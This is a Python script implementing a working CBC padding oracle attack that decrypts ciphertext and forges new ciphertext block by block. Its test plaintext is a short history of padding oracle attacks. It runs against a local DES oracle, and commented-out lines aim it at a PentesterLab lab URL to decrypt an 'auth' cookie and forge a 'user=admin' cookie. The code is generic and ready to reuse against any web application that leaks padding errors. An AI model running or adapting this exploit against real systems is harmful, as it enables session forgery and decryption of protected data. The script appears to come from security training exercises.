#!/usr/bin/env python3
import requests
from Crypto.Cipher import DES
from base64 import b64encode, b64decode
from urllib.parse import quote, unquote
from Crypto.Util.Padding import pad, unpad


msg = b'''
Attacks using padding oracles.

The original attack was published in 2002 by Serge Vaudenay. Concrete \
instantiations of the attack were later realised against SSL and IPSec. It \
was also applied to several web frameworks, including JavaServer Faces, Ruby \
on Rails and ASP.NET as well as other software, such as Steam gaming client. \
In 2012 it was shown to be effective against some hardened security devices.\
While these earlier attacks were fixed by most TLS implementors following \
its public announcement, a new variant, the Lucky Thirteen attack, published \
in 2013, used a timing side-channel to re-open the vulnerability even in \
implementations that had previously been fixed. As of early 2014, the attack \
is no longer considered a threat in real-life operation, though it is still \
workable in theory (see signal-to-noise ratio) against a certain class of \
machines. As of 2015, the most active area of development for attacks upon \
cryptographic protocols used to secure Internet traffic are downgrade \
attack, such as Logjam and Export RSA/FREAK attacks, which trick clients into \
using less-secure cryptographic operations provided for compatibility with \
legacy clients when more secure ones are available. An attack called POODLE \
(late 2014) combines both a downgrade attack (to SSL 3.0) with a padding \
oracle attack on the older, insecure protocol to enable compromise of the \
transmitted data. In May 2016 it has been revealed in CVE-2016-2107 that the \
fix against Lucky Thirteen in OpenSSL introduced another padding oracle.'''


class PaddingOracle:
    def __init__(self, data, block_size, tester):
        self.data = data
        self.tester = tester
        self.block_size = block_size

    def __padding_oracle_attack(self, block1, block2):
        random_block = bytearray(b'\x00' * self.block_size)
        intermediate_block = [0] * self.block_size
        result_block = [0] * self.block_size

        for i in range(self.block_size - 1, -1, -1):
            pad_byte = self.block_size - i
            for b in range(0, 256):
                random_block[i] = b
                if self.tester(random_block + block2):
                    intermediate_block[i] = random_block[i] ^ pad_byte
                    result_block[i] = intermediate_block[i] ^ block1[i]
                    # tweak padding in random_block
                    for j in range(i, self.block_size):
                        random_block[j] = intermediate_block[j] ^ (pad_byte + 1)
                    break

        return bytes(result_block)

    def decrypt_blocks(self):
        blocks = [self.data[i:i + self.block_size] for i in range(0, len(self.data), self.block_size)]
        plaintext = [i for i in bytearray(blocks[0])]

        for i in range(len(blocks) - 1):
            print('[+] decrypting block {} out of {}'.format(i + 2, len(blocks)))
            (c1, c2) = (blocks[i], blocks[i + 1])
            plaintext += self.__padding_oracle_attack(c1, c2)
        return bytes(plaintext)

    def encrypt_blocks(self):
        plaintext = pad(self.data, self.block_size)
        blocks = [plaintext[i:i + self.block_size] for i in range(0, len(plaintext), self.block_size)]
        blocks += [b'\x00' * self.block_size]

        for i in range(len(blocks) - 1, 0, -1):
            print('[+] encrypting block {} out of {}'.format(i + 1, len(blocks)))
            (c1, c2) = (blocks[i - 1], blocks[i])
            blocks[i - 1] = self.__padding_oracle_attack(c1, c2)
        return b''.join(blocks)


def encrypt_DES(data):
    cipher = DES.new(key=b'testtest', mode=DES.MODE_CBC, IV=b'12345678')
    return cipher.encrypt(pad(data, 8))


def decrypt_DES(data):
    cipher = DES.new(key=b'testtest', mode=DES.MODE_CBC, IV=data[0:8])
    return unpad(cipher.decrypt(data[8:]), 8)


def test_padding(data):
    cipher = DES.new(key=b'testtest', mode=DES.MODE_CBC, IV=b'12345678')
    try:
        unpad(cipher.decrypt(data), 8)
    except ValueError:
        return False
    return True


def test_padding_pentesterlab(data):
    url = 'http://ptl-43c71e18-9e58f150.libcurl.so/index.php'
    r = requests.get(url, cookies={'auth': quote(b64encode(data))})
    if r.content.decode() == 'Invalid padding':
        return False
    return True


if __name__ == '__main__':
    #print(PaddingOracle(b64decode(unquote('u7bvLewln6MF%2Bf3%2BFv9hwhBc1BzI4lfl')), 8, test_padding_pentesterlab).decrypt_blocks())
    #print(PaddingOracle(b'user=admin', 8, test_padding_pentesterlab).encrypt_blocks())

    test_encrypt = PaddingOracle(msg, 8, test_padding).encrypt_blocks()
    print(test_encrypt)

    test_decrypt = PaddingOracle(test_encrypt, 8, test_padding).decrypt_blocks()
    print(test_decrypt)
